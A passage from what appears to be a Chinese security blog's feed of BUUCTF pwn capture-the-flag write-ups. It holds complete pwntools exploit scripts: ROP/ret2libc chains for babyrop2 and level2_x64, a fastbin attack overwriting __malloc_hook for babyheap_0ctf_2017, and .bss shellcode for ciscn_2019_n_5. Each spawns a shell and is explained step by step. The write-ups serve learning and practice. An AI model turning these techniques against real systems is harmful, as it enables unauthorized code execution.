class="number">0x0000000000400731</span></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">s_addr=<span class="number">0x0000000000400770</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(s_addr)+p64(pop_rsi)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;World again, &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;World again, &#x27;</span>)</span><br><span class="line">read_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">base_libc=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base_libc+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = base_libc+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(sh)+p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面是你获取的地址，64位中的前六个参数依次保存在rdi，rsi，rdx，rcx，r8，r9中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi=0x0000000000400733//rdi</span><br><span class="line">pop_rsi=0x0000000000400731//rsi</span><br><span class="line">printf_plt=elf.plt[&#x27;printf&#x27;]</span><br><span class="line">read_got=elf.got[&#x27;read&#x27;]</span><br><span class="line">main_addr=elf.sym[&#x27;main&#x27;]</span><br><span class="line">s_addr=0x0000000000400770//字符串有%s的地址</span><br></pre></td></tr></table></figure><p>关键性代码<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(s_addr)+p64(pop_rsi)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure><p>一.’a’*(0x20+8)造成溢出,覆盖到了返回地址</p><p>二.p64(pop_rdi)+p64(s_addr)-&gt;我们原本语句的返回地址上写入了pop_rdi,ret,现在就是把pop_rdi,对应参数s_addr执行后的值给了rdi,然后执行ret</p><p>三.p64(pop_rsi)+p64(read_got)+p64(0)+p64(printf_plt)说明你调用pop_rsi的第2个参数，来达到泄漏libc,第一个参数rsi的第一个参数为read_got，r15为0,然后调用ret来输出参数</p><p>四.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system(/bin/sh)</p><p>由于出现welcome会出现两次，那么再接受一次不就好了吗？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;World again, &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;World again, &#x27;</span>)</span><br><span class="line">read_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后就是非常套路化的计算libc_base了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">base_libc=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base_libc+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = base_libc+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure><p>小结:</p><p>这个日子过的真不错,学CAD!还必须交作业,直接整自闭了,自闭了四节课了。我寻思过完这个学期都要跑路了.整无语了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;babyrop2&quot;&gt;&lt;a href=&quot;#babyrop2&quot; class=&quot;headerlink&quot; title=&quot;babyrop2&quot;&gt;&lt;/a&gt;babyrop2&lt;/h1&gt;&lt;p&gt;先查看保护:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-babyheap-0ctf-2017</title>
    <link href="http://example.com/2022/03/10/buuctf-babyheap-0ctf-2017/"/>
    <id>http://example.com/2022/03/10/buuctf-babyheap-0ctf-2017/</id>
    <published>2022-03-10T03:51:22.000Z</published>
    <updated>2022-03-10T03:52:22.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>根据exp的分析记住他这个是Ubuntu16的环境,不然libc会有细微差别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,26448)</span></span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>) </span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">  p.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvline()</span><br><span class="line">  <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x80</span>) <span class="comment"># 4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)  <span class="comment"># 为了后面malloc做准备，绕过检查</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">&#x27;bbbbcccc&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4527a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"> </span><br><span class="line">allocate(<span class="number">255</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我们先创建4个0x10的一个0x80的堆块,然后free掉0,1然后fastbins是单向链表链接的（依赖 fd 指针链接下一个 fastbin），所以我们 free 完之后 ,情况如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">allo(0x10)#0</span><br><span class="line">allo(0x10)#1</span><br><span class="line">allo(0x10)#2</span><br><span class="line">allo(0x10)#3</span><br><span class="line">allo(0x80)#4</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure><p>情况如下(看第2个堆块,fd指针指向堆块1的堆块)</p><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220307203503487.png" alt="image-20220307203503487"></p><p>是修改堆的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>看从开始写入的地址是在0x55c52e9b0010修改地址为开始修改的指针为0x000055c52e9b0080,他那个fd指针,指向的是4个堆这样相当于被free并存放在fastbin中</p><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220307210316638.png" alt="image-20220307210316638"></p><p>fastbin</p><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220308081822514.png" alt="image-20220308081822514"></p><p>这波,向chunk3写入数据，填充chunk4的size块为0x21。因为fastbin有一个原则：就是通过fd指针连接的一定是相同大小的嘞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure><p>第一个就是申请回来free掉的,chunk2 放入到刚才chunk1所在的位置，第2次申请过来的将chunk2的fd指针指向的chunk4回来，也就是现在index和index4的位置上都是chunk4,下面fill的1和2都是填充数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">fill(1,&#x27;aaaabbbb&#x27;)</span><br><span class="line">fill(2,&#x27;bbbbcccc&#x27;)</span><br></pre></td></tr></table></figure><p>这段代码将chunk4的size改为0x91(至于为什么多余一个1,这个是size的标志位的P位，P=1时,前一个chunk正在使用,这是为了防止chunk进行合并)申请0x80是为了chunk4不与top chunk连接，再将chunk4放入unsorted bin中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) * 3</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">allocate(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure><p>因为之前释放到unsorted bin中，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220309210609005.png" alt="image-20220309210609005"></p><p>magic命令发现发现malloc__hook和libc基地址的偏移为0x3c4b10,然后看向main_arena的地址,发现附近就是__malloc_hook的地址,也是知道malloc_hook和main_arena偏移为-0x10,减去得到malloc_hook地址,那就很好说了</p><p>你main_arena-88-0x10=__malloc_hook的地址</p><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220309212006612.png" alt="image-20220309212006612"></p><p>将chunk4 allocate回来后放入fastbin中,然后我们需要在index4后伪造一个fake chunk,然后需要的大小要在0x60-0x7f之间,看wp找的位置是在以下图片下,然后计算的偏移是0x7efd87503aed-libc=0x3c4aed，这也就是修改chunk6的fd指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2, payload)</span><br></pre></td></tr></table></figure><p><img src="/2022/03/10/buuctf-babyheap-0ctf-2017/image-20220309220458565.png" alt="image-20220309220458565"></p><p>第一个allocate(0x60)分配chunk6</p><p>第二个allocate(0x60)会分配到chunk6的fd指针所指向的地址,libc_base+0x3c4aed</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)</span><br></pre></td></tr></table></figure><p> p64(0)*2进行内存对齐，因为找到的合适的大小的位置与malloc__hook的偏移为19，所以要对齐内存哦,0x4526a是one_gadget的一个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(0)*3</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x4527a)</span><br><span class="line">fill(6, payload)</span><br></pre></td></tr></table></figure><p>进行allocate之前需要检查malloc__hook函数的内容，如果为0，就跳过此步骤，如果不为0，就跳转到此部分执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allocate(255)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;babyheap-0ctf-2017&quot;&gt;&lt;a href=&quot;#babyheap-0ctf-2017&quot; class=&quot;headerlink&quot; title=&quot;babyheap_0ctf_2017&quot;&gt;&lt;/a&gt;babyheap_0ctf_2017&lt;/h2&gt;&lt;p&gt;根据exp的</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆的概念</title>
    <link href="http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
    <id>http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/</id>
    <published>2022-03-09T06:02:11.000Z</published>
    <updated>2022-03-10T02:44:27.755Z</updated>
    
    <content type="html"><![CDATA[<p>​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉!</p><p>​                                                                                                                                        —-自己学习记录</p><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆?"></a>什么是堆?</h2><p>​        以我的理解就是,堆是可以在程序中提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域,他由低地址向高地址方向增长.学过C语言的其实你也是可以看成结构体数组,然后数组每个元素都会开辟一块内存来储存数据,那么这块用来储存数据的内存就是堆。结构体在BSS段上,其内容就是堆的地址,也就是堆的指针.</p><p>讲讲函数吧！</p><p>申请内存(malloc函数)</p><p>释放内存(free函数)</p><p>突然没灵感了!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉!&lt;/p&gt;
&lt;p&gt;​                                                                         </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_n_5</title>
    <link href="http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/"/>
    <id>http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/</id>
    <published>2022-01-16T14:48:05.000Z</published>
    <updated>2022-01-16T14:48:48.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>保护全没开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);<span class="comment">//你第一次写入的值会到name的bss段里面</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你第一次写入的值会到name的bss段里面，第2次会有溢出0x20+8的溢出字符,那我们可以在第一个写入到name的bss段里面,然后通过第2次输入溢出来造成溢出,然后rdi指向bss段来执行shellcode</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25985</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">name=<span class="number">0x601080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(name)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-n-5&quot;&gt;&lt;a href=&quot;#ciscn-2019-n-5&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_n_5&quot;&gt;&lt;/a&gt;ciscn_2019_n_5&lt;/h1&gt;&lt;p&gt;保护全没开&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-level2_x64</title>
    <link href="http://example.com/2022/01/16/buuctf-level2-x64/"/>
    <id>http://example.com/2022/01/16/buuctf-level2-x64/</id>
    <published>2022-01-16T13:53:58.000Z</published>
    <updated>2022-01-16T13:54:33.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h1><p>这题其实跟babyrop这题差不多的原理,详细的我就不多说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./level2_x64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25435</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr =<span class="number">0x0000000000400603</span> </span><br><span class="line">bin_sh = <span class="number">0x0000000000600A90</span></span><br><span class="line">pop_rdi =<span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;level2-x64&quot;&gt;&lt;a href=&quot;#level2-x64&quot; class=&quot;headerlink&quot; title=&quot;level2_x64&quot;&gt;&lt;/a&gt;level2_x64&lt;/h1&gt;&lt;p&gt;这题其实跟babyrop这题差不多的原理,详细的我就不多说了&lt;/p&gt;
&lt;fi</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-[HarekazeCTF2019]baby_rop</title>
    <link href="http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/"/>
    <id>http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/</id>
    <published>2022-01-16T13:38:50.000Z</published>
    <updated>2022-01-16T13:39:53.389Z</updated>
    
